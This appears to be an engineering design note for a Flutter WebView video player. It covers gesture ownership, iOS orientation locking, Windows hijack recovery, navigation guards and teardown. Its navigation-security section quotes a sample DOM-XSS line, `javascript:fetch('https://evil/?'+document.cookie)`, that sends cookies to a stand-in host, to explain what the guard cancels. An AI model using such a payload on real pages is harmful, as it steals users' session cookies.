# WebView Player

`lib/presentation/screens/player/webview_player_screen.dart`
`lib/presentation/screens/player/web_view_player_config.dart`
`lib/presentation/screens/player/player_scripts.dart`

The player is a full-screen `InAppWebView` that loads a plugin-resolved
embed URL, tracks playback progress through an injected JS bridge, and
defends against the hijack patterns common on streaming embed pages.

---

## Gesture ownership

**No full-body `GestureDetector`.** An earlier swipe-to-dismiss wrapper
claimed all vertical drags in Flutter's gesture arena before the WebView
could receive them, breaking scrolling inside embedded lists. Dismiss is
the × button and system back only.

**`gestureRecognizers`** explicitly transfers vertical drag, horizontal
drag, and scale ownership to the WebView so Flutter widgets above it
never compete. Desktop passes an empty set — no gesture competition is
wanted there at all. Mobile transfers drag + scale so embedded list
scroll stays smooth.

**`gestureNavigationEnabled: false`** disables iOS WebView's built-in
swipe-to-navigate-back, which conflicts with content needing horizontal
swipes (carousels, tab bars inside the player).

---

## Orientation and immersive mode

Landscape lock happens in `initState`; `dispose` restores portrait plus
system UI. The iOS `Info.plist` declares both landscape orientations so
the lock behaves identically across platforms.

### The iOS two-step lock

iOS 16+ rejects a landscape-only `setPreferredOrientations` call with
*"None of the requested orientations are supported"* unless the
supported set is relaxed first. The sequence is:

1. Set `[landscapeLeft, landscapeRight, portraitUp]`
2. Wait `_kIosOrientationCommitDelay` (50 ms)
3. Set `[landscapeLeft, landscapeRight]`
4. `setEnabledSystemUIMode(immersiveSticky)`

50 ms has held up on iPhones from XS through 15 Pro. If the error
reappears on slower devices, bump it or switch to
`addPostFrameCallback`.

After the await, the code checks `_disposed` — if the user popped the
route during that 50 ms window, the second call would land on the parent
screen and leave it stuck in landscape + immersive.

### Episode handoff

`_navigatingToAnotherPlayer` latches when the user taps "Play Next".
`dispose()` consults it to skip `_restorePortrait`.

Without the skip, iOS route-transition ordering means the OLD screen's
portrait restore queues *after* the NEW screen's landscape lock. iOS
honours the most recent preference, so the device rotates to portrait
under the new player. Skipping the restore on handoff keeps landscape
across episodes.

---

## Hijack recovery (Windows only)

Two streaming-page attacks bypass the normal navigation guards on
WebView2:

### 1. `about:blank` click-jacker

An invisible `<a href="about:blank" target="_blank">` overlaid on the
player. The click fires `onCreateWindow`, which we reject by returning
`false` — but WebView2's fallback for a suppressed `target="_blank"`
navigation is to load the link in the **current** frame, blanking the
video.

WebView2 skips both `shouldOverrideUrlLoading` and `onLoadStart` for
that synthetic main-frame navigation, so `onUpdateVisitedHistory` is the
earliest signal available.

The filter is strict on `about:blank` / `about:` — the same callback
fires for legitimate in-page navigation (server switching). There is
deliberately **no** `_initialLoadComplete` gate: streaming sites that
SPA-redirect before progress reaches 100 % never latch the flag, which
would leave them with no recovery path. `about:blank` is never a
legitimate main-frame state for a streaming page.

**A pre-empt attempt that backfired:** calling `_recoverFromHijack` from
a microtask inside `onCreateWindow` fires *before* WebView2 starts the
`about:blank` load, so `stopLoading` is a no-op, the recovery completes
trivially, the cooldown latches — and the real recovery from
`onUpdateVisitedHistory` is then blocked by that cooldown, leaving the
user stuck.

### 2. Microsoft Defender SmartScreen takeover

Some embeds server-side redirect to ad domains (e.g.
`brightadnetwork.com`). When SmartScreen has the destination flagged,
WebView2 replaces the whole page with its red *"Reported Unsafe Site"*
warning. The URL stays unchanged but the title flips to a known
SmartScreen string — detected at `onTitleChanged`.

Windows-only by necessity: on other platforms a title containing one of
these markers is just a normal page (a docs site discussing the warning
dialog, for instance).

### Recovery action

Both do the same thing: stop the load, then `goBack()` — WebView2's
history still holds the embed page, so server selection and video
element state survive — falling back to `loadUrl(widget.url)` when there
is nothing to go back to.

### Rate limiting

**Per-type cooldown (`_kRecoveryCooldown`, 2 s)** debounces tight
re-entry of the *same* signal. SmartScreen fires `onTitleChanged`
repeatedly for one warning; `about:blank` fires several
`onUpdateVisitedHistory` callbacks during the transition. Keying by
recovery type means an `about:blank` recovery does not silence the
SmartScreen recovery firing milliseconds later for the same root
incident (embed page → bad redirect → both signals together).

**Circuit breaker** is a true sliding window over
`_kRecoveryWindowDuration`. Each recovery's timestamp goes into
`_recentRecoveries`; every call prunes stale entries and trips when the
live count crosses `_kMaxRecoveriesPerWindow`. This protects against
backends that 522 + redirect to a flagged ad
domain in a loop — after 3 attempts in 15 s the user gets an error and
can pick a different plugin.

The counter is **global across types** so a fast-cycling page tripping
both signals per load still escalates after 3 round-trips.

The sliding window replaced a fixed window that would lock users out at
a healthy long-term recovery rate whenever recoveries clustered just
inside the original window.

**Rollback on failure:** every native controller call is wrapped in
try/catch — `flutter_inappwebview`'s Windows C++ side throws
`E_INVALIDARG` (0x80070057) at `in_app_webview.cpp:1231` when
`stopLoading`/`goBack`/`loadUrl` run during a transitional WebView2
state. A failed call rolls back its `_recentRecoveries` entry; without
that, repeated transitional-state failures would burn the breaker budget
without ever recovering anything, and the user would see the "try a
different plugin" error despite no recovery having been attempted.

---

## Navigation security guards

### `javascript:` scheme

Main-frame `javascript:` navigation executes in the current document's
origin. Sub-frames legitimately use `<a href="javascript:void(0)">` as a
no-op click target, so it is allowed there — but a main-frame jump to
`javascript:fetch('https://evil/?'+document.cookie)` from a compromised
plugin or hijacked anchor is the textbook DOM-XSS vector. Cancelled
unconditionally.

### Cross-domain main-frame guard

Uses `_initialLoadComplete` (latched on the first progress=100 event)
rather than live `_loadProgress`. A programmatic
`location.assign('evil.com')` triggers `shouldOverrideUrlLoading` *while*
progress is dropping back to 0, so gating on `_loadProgress == 100`
would let the redirect through.

`_initialHostBase` is computed once in `initState` via `HostUtils`
(Public Suffix List backed, so `foo.co.uk` is handled correctly), making
each check an O(1) string compare.

### Permissions

Whitelist is **DRM (Widevine) only** — required for protected streaming.
Camera, microphone, geolocation, MIDI and everything else are always
denied; a video player never needs them. `PermissionResourceType` is not
a real Dart enum, so the set cannot be `const`.

### Multi-window

See [PLATFORM.md](PLATFORM.md#multi-window-support) — the setting is ON
for mobile and OFF for Windows, for platform-specific reasons.

---

## Lifecycle and teardown

### Disposal ordering

1. `_disposed = true` **first**, so any in-flight WebView callback
   short-circuits. `mounted` stays true until `super.dispose()` returns,
   which is too late for the Windows path where `_cleanupWebView`
   deliberately skips `stopLoading()`.
2. Null `_eventBridge` — it closes over `_onProgressUpdate` which
   captures `this`; nulling lets the GC reclaim both the bridge and any
   pending callback chain.
3. Flush progress if it was written but never committed via a
   pause/ended event.
4. Skip `_restorePortrait` when handing off to another player.

### `_cleanupWebView`

Drops the JS handler **before** nulling the controller reference. The
callback registered in `onWebViewCreated` captures `this` through
`_eventBridge` and `_resetControlsTimer`, so leaving the handler attached
pins the State alive for as long as the native controller exists. On
Windows WebView2 the native controller can outlive the Flutter platform
view — a leaked handler leaks one State per playback.

`removeJavaScriptHandler` can throw on Windows during transitional
WebView2 states (same root cause as the `E_INVALIDARG` above). The
controller is about to be released, so the throw is logged and ignored.

Windows is sensitive to imperative calls during disposal transitions, so
the reference is nulled and the native platform view disposes itself.

### The Riverpod `ref` problem

Riverpod 3.x throws *"Bad state: Using `ref` when a widget is about to or
has been unmounted"* if `ref` is touched during `dispose()` — `ref`
depends on `BuildContext`, which is being deactivated.

`_providerContainer` caches the container in `initState` with
`listen: false`. That uses
`getElementForInheritedWidgetOfExactType` under the hood which — unlike
`dependOnInheritedWidgetOfExactType` — is safe in `initState` and does
not register a dependency that would fire `didChangeDependencies` later
(the previous source of a `LateInitializationError`).

Several WebView callbacks (`onUpdateVisitedHistory`,
`shouldOverrideUrlLoading`) also use the cached container, because the
native side can fire them after the user has popped the route on
Windows.

---

## Rebuild-cost optimisations

| Field | Why not `setState` |
|---|---|
| `_loadProgress` | A `ValueNotifier` — only the progress bar and initial-load overlay react. In `setState` every percent rebuilt the entire `Scaffold > Stack` including the `InAppWebView`. |
| `_nextEpisodeKey` | Hoisted to a field. Only `mediaId`/`mediaType`/`season`/`episode` participate in `UserProgress.==`, so a fresh instance per build with `DateTime.now()` was pure allocator pressure on the chrome rebuild hot path. |
| `_lastNextEpisodeTriggered` | Bookkeeping, read only inside its own method, never in `build`. Plain assignment; `setState` would schedule a rebuild that does nothing. |
| `_dismissedNextEpisodeOverlay` | Same. |

### Controls timer coalescing

`_resetControlsTimer` re-arms at most once per
`_kControlsTimerCoalesceMs` (500 ms). The previous version cancelled and
recreated a 5 s `Timer` on every pointer event — on Windows
`Listener.onPointerHover` fires once per frame (~60 Hz) while the mouse
moves. The 5 s hide delay now slips by at most that interval after the
user stops moving.

A **single `Listener`** covers every pointer kind (`onPointerDown` /
`onPointerMove` for touch and held mouse, `onPointerHover` for bare
desktop hover). The previous `MouseRegion` + `Listener` pair duplicated
every mouse event, calling `_resetControlsTimer` twice per frame on
Windows.

### Fullscreen state

`_toggleFullScreen` deliberately does **not** `setState`. The
`WindowListener` registered in `initState` updates `_isFullScreen` from
`onWindowEnterFullScreen` / `onWindowLeaveFullScreen` once the OS
confirms. Writing in both places races: if the user toggled fullscreen
externally during the awaits, the listener writes the correct value first
and a `setState(!isFull)` would clobber it with the pre-toggle value.

`_checkFullScreen` has the same guard — only push state if it would
actually change.

---

## Progress tracking

`PlayerEvent.tryParse` normalises progress to the 0–100 scale at the
parse boundary. An earlier `if (progress <= 1.0) progress *= 100`
heuristic misfired below 1 % real progress (0.83 % → 83 %) and triggered
the Next-Episode overlay seconds into playback.

Continue Watching is invalidated only on **pause/ended**. The throttled
`timeupdate` fires every ~5 s during playback and used to rebuild the
home screen continuously. The repository write still happens on every
update so progress survives a crash.

Hive writes are fire-and-forget with explicit error handling so a write
failure cannot escape as an unhandled async error.

### Message parsing

The bridge parses JSON **once** at the boundary rather than doing a raw
`rawMessage.contains('"type":"USER_ACTIVITY"')` substring check. The
substring match collides with any payload mentioning the literal string
in a nested field (e.g. `data.notes = "see \"type\":\"USER_ACTIVITY\""`),
silently dropping legitimate `PLAYER_EVENT`s. Non-JSON payloads fall
through to `EventBridge.handleMessage`, which has its own handling.

---

## Keyboard handling

- System volume keys always bubble up.
- Modifier keys are ignored, preventing Flutter's internal state tracker
  from desynchronising (fixes an "Alt Left" assertion crash).
- On **Windows**, everything else returns `.handled` to stop the WebView
  triggering framework assertions during layout. On Android/iOS it
  returns `.ignored` so system and hardware keys work naturally.

---

## Miscellaneous

**WebView `ValueKey`** uses the full URL, not `hashCode` — `String`
hashCode collides, and a collision makes the framework reuse the previous
WebView state for a different URL.

**Error rendering** happens directly in `build` without mutating widget
state — that would trip a setState-in-build assertion or permanently
latch `_hasError`, leaving the screen stuck if the env provider later
recovered. Retry just invalidates the provider.
`_buildErrorState(overrideMessage:, onRetry:)` lets transient errors
(Windows WebView env init failure) render their own message without
touching `_hasError`/`_errorMsg`, which belong to the in-WebView load
lifecycle.

**`_retry`** resets every page-load-lifecycle-dependent field: the
recovery circuit-breaker counter, the per-type cooldown map, and
`_initialLoadComplete`. The previous version only flipped `_hasError`, so
a user who tripped the breaker could not escape it via Retry. It also
re-issues `loadUrl` explicitly — the `ValueKey` is bound to `widget.url`
which does not change, so the `InAppWebView` is reused and would
otherwise keep showing the failed page.

**Initial loading overlay** shows only while progress ≤ 15 % and is
wrapped in `IgnorePointer` so taps reach the WebView while the spinner is
visible (fixes a laggy play button).

**Next-episode overlay dismissal** flips `_showNextEpisodeOverlay` so the
next build short-circuits at the top. Leaving it `true` keeps the
overlay's `nextEpisodeForProgressProvider` subscription alive even
off-screen.

**System back** pops one level to wherever the player was pushed from
(typically `/details`), matching the history-aware contract described in
[NAVIGATION.md](NAVIGATION.md). `_dismiss` handles window-manager cleanup
plus the actual `context.pop()`; the in-app × button uses the same path.
It is guarded by `_isNavigating` and unwedges the flag on any failure
(windowManager error, refused pop) so the user can retry.

---

## `PlayerScripts`

Injected JS lives in `assets/js/` as real `.js` files rather than inline
Dart string constants (~900 lines previously). That buys syntax
highlighting and ESLint/JSHint tooling, diff readability (JS changes
don't move Dart line numbers), and the ability to run a real JS test
harness.

`main()` awaits `PlayerScripts.load()` alongside `HiveService.init()` and
`HostUtils.init()`, so everything is cached before `runApp`. Accessing
`.instance` before `load()` throws `StateError` — failing loudly beats
silently injecting empty scripts.

### Resume-time sanitisation

`videoProgressWith(resumeTime)` sanitises `NaN`, `Infinity`, and negative
values to `0` before substituting into the placeholder. Dart's
`double.toString()` emits `'NaN'` and `'Infinity'` literally and both are
valid JS identifiers — without sanitisation the generated
`var RESUME_TARGET = NaN;` parses fine, every
`RESUME_TARGET >= video.duration` check silently evaluates false, and
auto-resume breaks with no error on either side.
